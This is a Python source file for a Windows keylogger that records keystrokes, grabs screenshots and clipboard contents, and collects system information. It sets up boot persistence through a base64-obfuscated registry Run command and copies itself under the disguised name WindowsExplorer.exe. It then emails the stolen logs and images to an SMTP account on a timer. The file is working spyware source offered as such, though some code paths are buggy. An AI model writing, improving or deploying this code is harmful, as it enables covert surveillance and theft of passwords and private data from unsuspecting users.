import pynput.keyboard as pk
import threading

# Time and date functionality
from datetime import datetime
import time

# Email Functionality
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

# For Playing with Windows
import socket
import subprocess
import os
import sys
import shutil

# For Capturing Screenshots
import win32clipboard
from PIL import ImageGrab

# For storing screenshots in a queue
from collections import deque

# For Encrypting files
import base64

# User defined module for Fetching Computer Info
from com_info import fetch_info


class KeyLogger():

    def __init__(self, interval, email, password):
        """Constructor for initializing all the required variables"""

        self.become_persistent()
        self.log = 'KeyLogger started'

        self.interval = interval
        self.email = email
        self.password = password

        self.msg_to_be_sent_later = ''
        self.clipboard = ''

        self.screenshot_error = ''
        self.screenshot_list = deque()
        self.ss_enterKey_count = 0
        self.ss_deleteKey_count = 0

        # self._FILE_PATH = r'E:\VISHWAS\Computer Science\Coding\Python\Projects\Keylogger'
        self._FILE_PATH = os.environ['appdata'] # Path where the required files and screenshots will be saved

        self._EXT = '\\'
        self._SS_INFO = ''
        self._KEYS_INFO = 'EXPLORER_LOG.txt'  # Name of the file having keylogs
        self._SYSTEM_INFO = 'READ_ME.txt'  # Name of the file having system info
        self.files_to_encrypt = [self._FILE_PATH+self._EXT +
                                 self._KEYS_INFO, self._FILE_PATH+self._EXT+self._SYSTEM_INFO]

    def start(self):
        """Start the keylogger"""
        key_listener = pk.Listener(on_press=self.process_key_press)
        with key_listener:
            self.report()
            key_listener.join()

    def become_persistent(self):
        """This functions helps the keylogger to start as soon as the system boots by modifying the values in registry"""
        try:
            file_location = self._FILE_PATH + "\\WindowsExplorer.exe"

            if not os.path.exists(file_location):
                shutil.copyfile(sys.executable, file_location)
                command = 'reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + file_location + '"'
                command = base64.b64encode(command.encode()).decode()
                subprocess.call(base64.b64decode(
                    command.encode()).decode(), shell=True)
                    
        except Exception:
            pass

    def process_key_press(self, key):
        """Function for logging the keystrokes"""
        try:
            current_key = str(key.char)

        except AttributeError:
            if key == key.space:
                current_key = ' '
            elif key == key.enter:
                current_key = ' <'+str(key)+'> \n'
                if self.ss_enterKey_count < 10:
                    # Take ss when ENTER key is pressed
                    self.screenshot()
                    self.ss_enterKey_count += 1
            elif key == key.delete:
                current_key = ' <' + str(key) + '> '
                if self.ss_deleteKey_count < 5:
                    # Take ss when DEL key is pressed
                    self.screenshot()
                    self.ss_deleteKey_count += 1
            else:
                current_key = ' <' + str(key) + '> '

        # print(self.log)
        self.log += current_key

    def write_log(self, msg):
        """Function to write the logged keystrokes in file"""
        if self.msg_to_be_sent_later == '':
            msg = msg + self.screenshot_error
        else:
            msg = self.msg_to_be_sent_later + '\n' + msg + \
                self.screenshot_error

        msg = str(datetime.now()) + ':\n' + msg
        msg = base64.b64encode(msg.encode()).decode()

        with open(self._FILE_PATH+self._EXT+self._KEYS_INFO, 'w') as key_log:
            key_log.write(msg)
            key_log.close()
        self.log = ''

    def attach_file(self, msg, filename):
        """Attaching the message to file"""
        if os.path.exists(self._FILE_PATH + self._EXT + filename):
            attachment = open(self._FILE_PATH + self._EXT + filename, 'rb')
            p = MIMEBase('application', 'octet-stream')
            p.set_payload(attachment.read())
            encoders.encode_base64(p)
            p.add_header('Content-Disposition',
                         "attachment; filename= %s" % filename)
            msg.attach(p)

    def copy_clipboard(self):
        """Fetching the contents of clipboard"""
        try:
            win32clipboard.OpenClipboard()
            self.clipboard = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
        except:
            self.clipboard = 'Failed to copy the contents of clipboard'

    def screenshot(self):
        """Taking screenshot"""
        try:
            self._SS_INFO = f"windows('{datetime.now()}').png"
            self._SS_INFO = self._SS_INFO.replace(':', '-')
            img = ImageGrab.grab()
            img.save(self._FILE_PATH+self._EXT+self._SS_INFO)
            self.screenshot_list.append(self._SS_INFO)
            self.screenshot_error = ''
        except Exception:
            self.screenshot_error = "\nScreenshot Error! Failed to take the screenshot\n"

    def computer_info(self):
        """Fething the critical info about system"""
        fetch_info(self._FILE_PATH + self._EXT + self._SYSTEM_INFO)

    def send_mail(self, email, password):
        """Function to send encrypted logs and screenshots through mail"""
        try:
            msg = MIMEMultipart()
            msg['From'] = email
            msg['To'] = email
            msg['Subject'] = f'From {socket.gethostname()} @{datetime.now()}'

            self.attach_file(msg, self._KEYS_INFO)
            self.attach_file(msg, self._SYSTEM_INFO)

            while self.screenshot_list:
                screenshot = self.screenshot_list[0]
                self.attach_file(msg, screenshot)
                try:
                    os.remove(self._FILE_PATH+self._EXT+screenshot)
                except:
                    pass
                self.screenshot_list.popleft()

            s = smtplib.SMTP('smtp.gmail.com', 587)
            s.starttls()
            s.login(email, password)
            text = msg.as_string()
            s.sendmail(email, email, text)
            s.quit()
            self.msg_to_be_sent_later = ''
            self.ss_enterKey_count = 0
            self.ss_deleteKey_count = 0

        except smtplib.SMTPException:
            # print('Error, cannot send mail!')
            pass

        except socket.gaierror:
            # print('Connect to internet')
            with open(self._FILE_PATH+self._EXT+self._KEYS_INFO, 'r') as key_log:
                data = key_log.read()
                self.msg_to_be_sent_later = '\n*' + \
                    base64.b64decode(data.encode()).decode()+'*\n'
                key_log.close()

            while self.screenshot_list:
                try:
                    os.remove(self._FILE_PATH+self._EXT+screenshot)
                except:
                    pass
                self.screenshot_list.popleft()

    def report(self):
        """Function that is called after set intervals using the concept of threading"""
        # print(self.log)
        self.copy_clipboard()
        self.log += ("\n\n\nClipboard Contents: " + self.clipboard + "\n\n")

        self.screenshot()
        self.computer_info()
        self.write_log(self.log)
        self.send_mail(email=self.email, password=self.password)

        time.sleep(2)
        timer = threading.Timer(interval=self.interval, function=self.report)
        timer.start()


if __name__ == '__main__':
    print(__name__)
